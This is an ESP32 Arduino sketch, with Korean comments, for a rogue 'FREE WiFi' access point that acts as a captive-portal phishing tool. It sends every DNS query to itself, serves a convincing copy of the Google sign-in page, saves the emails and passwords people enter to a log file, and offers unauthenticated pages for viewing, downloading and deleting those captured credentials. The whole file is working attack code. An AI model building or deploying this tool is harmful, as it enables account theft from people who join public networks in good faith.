#include <WiFiMulti.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SPIFFS.h>

const char* SSID_NAME = "FREE WiFi";
const char* PASSWORD = ""; // 변경 필요

IPAddress APIP(172, 0, 0, 1); // 게이트웨이
DNSServer dnsServer;
WebServer webServer(80);

unsigned long startTime = millis(); // ESP32가 켜진 시점을 기록
const long dayMillis = 86400000; // 하루의 밀리초 (24 * 60 * 60 * 1000)

const char* loginFileName = "/log.txt";
const char* imageFileName = "/1.png"; // 이미지 파일명

String index() {
  return "<!DOCTYPE html><html lang='ko'><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Google Login Form</title><style>body {margin: 0;padding: 0;background-size: cover;font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;}.box {position: absolute;top: 50%;left: 50%;transform: translate(-50%, -50%);width: 25rem;padding: 2.5rem;box-sizing: border-box;border: 1px solid #dadce0;-webkit-border-radius: 8px;border-radius: 8px;}.google-logo {display: flex;justify-content: center;padding-bottom: 15px;}.box h2 {margin: 0px 0 -0.125rem;padding: 0;color: #fff;text-align: center;color: #202124;font-family: 'Google Sans','Noto Sans Myanmar UI',arial,sans-serif;font-size: 24px;font-weight: 400;}.box p {font-size: 16px;font-weight: 400;letter-spacing: .1px;line-height: 1.5;margin-bottom: 25px;text-align: center;}.box .inputBox {position: relative;}.box .inputBox input {width: 93%;padding: 0.625rem 10px;font-size: 1rem;letter-spacing: 0.062rem;margin-bottom: 1.875rem;border: 1px solid #ccc;background: transparent;border-radius: 4px;}.box .inputBox label {position: absolute;top: 0;left: 10px;padding: 0.625rem 0;font-size: 1rem;color: grey;pointer-events: none;transition: 0.3s;}.box .inputBox input:focus ~ label,.box .inputBox input:valid ~ label,.box .inputBox input:not([value='']) ~ label {top: -1.125rem;left: 10px;color: #1a73e8;font-size: 0.75rem;background-color: white;height: 10px;padding-left: 5px;padding-right: 5px;}.box .inputBox input:focus {outline: none;border: 2px solid #1a73e8;}.box input[type='submit'] {border: none;outline: none;color: #fff;background-color: #1a73e8;padding: 0.625rem 1.25rem;cursor: pointer;border-radius: 0.312rem;font-size: 1rem;float: right;}.box input[type='submit']:hover {background-color: #287ae6;box-shadow: 0 1px 1px 0 rgba(66,133,244,0.45), 0 1px 3px 1px rgba(66,133,244,0.3);}.box .inputBox input:focus ~ label,.box .inputBox input:valid ~ label,.box .inputBox input:not([value='']) ~ label {top: -1.125rem;left: 10px;color: #1a73e8;font-size: 0.75rem;background-color: white;height: 10px;padding-left: 5px;padding-right: 5px;}.box .inputBox input:focus {outline: none;border: 2px solid #1a73e8;}.forgot {margin-top: -20px;}.forgot button {-webkit-border-radius: 4px;border-radius: 4px;color: #1a73e8;display: inline-block;font-weight: 500;letter-spacing: .25px;outline: 0;position: relative;background-color: transparent;cursor: pointer;font-size: inherit;padding: 0;text-align: left;border: 0;}</style></head><body><div class='box'><div id='logo' class='google-logo' title='Google'><div class='rr0DNb' jsname='l4eHX'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' aria-hidden='true' class='l5Lhkf'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z'></path></g><g id='YGlOvc'><path fill='#34a853' d='M58.193.67h2.564v17.44h-2.564z'></path></g><g id='BWfIk'><path fill='#4285f4' d='M54.152 8.066h-.088c-.588-.697-1.716-1.33-3.136-1.33-2.98 0-5.71 2.614-5.71 5.98 0 3.338 2.73 5.933 5.71 5.933 1.42 0 2.548-.64 3.136-1.36h.088v.86c0 2.28-1.217 3.5-3.183 3.5-1.61 0-2.6-1.15-3-2.12l-2.28.94c.65 1.58 2.39 3.52 5.28 3.52 3.06 0 5.66-1.807 5.66-6.206V7.21h-2.48v.858zm-3.006 8.237c-1.804 0-3.318-1.513-3.318-3.588 0-2.1 1.514-3.635 3.318-3.635 1.784 0 3.183 1.534 3.183 3.635 0 2.075-1.4 3.588-3.19 3.588z'></path></g><g id='e6m3fd'><path fill='#fbbc05' d='M38.17 6.735c-3.28 0-5.953 2.506-5.953 5.96 0 3.432 2.673 5.96 5.954 5.96 3.29 0 5.96-2.528 5.96-5.96 0-3.46-2.67-5.96-5.95-5.96zm0 9.568c-1.798 0-3.348-1.487-3.348-3.61 0-2.14 1.55-3.608 3.35-3.608s3.348 1.467 3.348 3.61c0 2.116-1.55 3.608-3.35 3.608z'></path></g><g id='vbkDmc'><path fill='#ea4335' d='M25.17 6.71c-3.28 0-5.954 2.505-5.954 5.958 0 3.433 2.673 5.96 5.954 5.96 3.282 0 5.955-2.527 5.955-5.96 0-3.453-2.673-5.96-5.955-5.96zm0 9.567c-1.8 0-3.35-1.487-3.35-3.61 0-2.14 1.55-3.608 3.35-3.608s3.35 1.46 3.35 3.6c0 2.12-1.55 3.61-3.35 3.61z'></path></g><g id='idEJde'><path fill='#4285f4' d='M14.11 14.182c.722-.723 1.205-1.78 1.387-3.334H9.423V8.373h8.518c.09.452.16 1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 4.69-1.856z'></path></g></svg></div></div><h2>Sign in</h2><p>WiFi account</p><form action='/post' method='post'><div class='inputBox'><input type='email' name='email' required='' onkeyup=\"this.setAttribute('value', this.value);\" style='width: 93%;padding: 0.625rem 10px;font-size: 1rem;letter-spacing: 0.062rem;margin-bottom: 1.875rem;border: 1px solid #ccc;background: transparent;border-radius: 4px;'><label>Email</label></div><div class='inputBox'><input type='password' name='password' required='' onkeyup=\"this.setAttribute('value', this.value);\" style='width: 93%;padding: 0.625rem 10px;font-size: 1rem;letter-spacing: 0.062rem;margin-bottom: 1.875rem;border: 1px solid #ccc;background: transparent;border-radius: 4px;'><label>Password</label></div><input type='submit' value='Next'></form><div class='forgot'>Not your computer?<br>Use Guest mode to sign in<br> privately.<br><br><button type='button'>Forgot password?</button></div></div></body></html>";
}

void handlePost() {
  String email = webServer.arg("email");
  String password = webServer.arg("password");

  if (email == "" || password == "") {
    webServer.sendHeader("Location", "/");
    webServer.send(302);
    return;
  }

  File logFile = SPIFFS.open(loginFileName, "a");
  if (logFile) {
    logFile.println("[ Email : " + email + " ] " + " [ PassWord : " + password + " ] " + "Time : " + formatTimeSinceStart());
    logFile.close();
  } else {
    Serial.println("Failed to open log.txt for writing");
  }

  webServer.sendHeader("Location", "/info");
  webServer.send(302);
}

void handlePass() {
  String passContent = "<p style='background-color: #FAEBD7; font-size: 50px;'>Esp32 Coed JeonTaeMin</p>";

  File logFile = SPIFFS.open(loginFileName, "r");
  if (logFile) {
    int index = 1;
    while (logFile.available()) {
      String line = logFile.readStringUntil('\n');
      passContent += "<h3>" + String(index) + ". " + line + "</h3>";
      index++;
    }
    logFile.close();
  } else {
    passContent += "<p>Login information file not found.</p>";
  }

  webServer.send(200, "text/html", passContent);
}

void handleDelete() {
  if (SPIFFS.exists(loginFileName)) {
    SPIFFS.remove(loginFileName);
    webServer.send(200, "text/plain", "Login information deleted successfully.");
  } else {
    webServer.send(404, "text/plain", "Login information file not found.");
  }
}

void handleInfo() {
  File imageFile = SPIFFS.open(imageFileName, "r");
  if (imageFile) {
    webServer.streamFile(imageFile, "image/png");
    imageFile.close();
  } else {
    webServer.send(404, "text/html", "<h1>Image file not found</h1><p>Failed to load the image.</p>");
  }
}

void handleDownload() {
  File logFile = SPIFFS.open(loginFileName, "r");
  if (!logFile) {
    webServer.send(404, "text/plain", "로그 파일을 찾을 수 없습니다.");
    return;
  }

  webServer.sendHeader("Content-Disposition", "attachment; filename=log.txt");
  webServer.streamFile(logFile, "text/plain");
  logFile.close();
}

String formatTimeSinceStart() {
  unsigned long currentTime = millis();
  unsigned long elapsedTime = currentTime - startTime;
  int days = elapsedTime / dayMillis; // 경과한 일수 계산
  int hours = (elapsedTime % dayMillis) / 3600000; // 경과한 시간 계산
  int minutes = (elapsedTime % 3600000) / 60000; // 경과한 분 계산
  int seconds = (elapsedTime % 60000) / 1000; // 경과한 초 계산

  char timeString[20];
  sprintf(timeString, "%02d:%02d:%02d Day %d", hours, minutes, seconds, days);
  return String(timeString);
}

void setup() {
  Serial.begin(115200);

  // WiFi 연결 설정
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME, PASSWORD);

  // SPIFFS 초기화
  if (!SPIFFS.begin()) {
    Serial.println("SPIFFS initialization failed");
    return;
  }

  // DNS 서버 시작
  dnsServer.start(53, "*", APIP); // DNS spoofing (Only HTTP)

  // 웹 서버 시작
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", index());
  });
  webServer.on("/post", HTTP_POST, handlePost);
  webServer.on("/pass", HTTP_GET, handlePass);
  webServer.on("/delete", HTTP_GET, handleDelete);
  webServer.on("/info", HTTP_GET, handleInfo);
  webServer.on("/down", HTTP_GET, handleDownload);

  // 웹 서버 시작
  webServer.begin();

  Serial.println("HTTP server and DNS server started");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
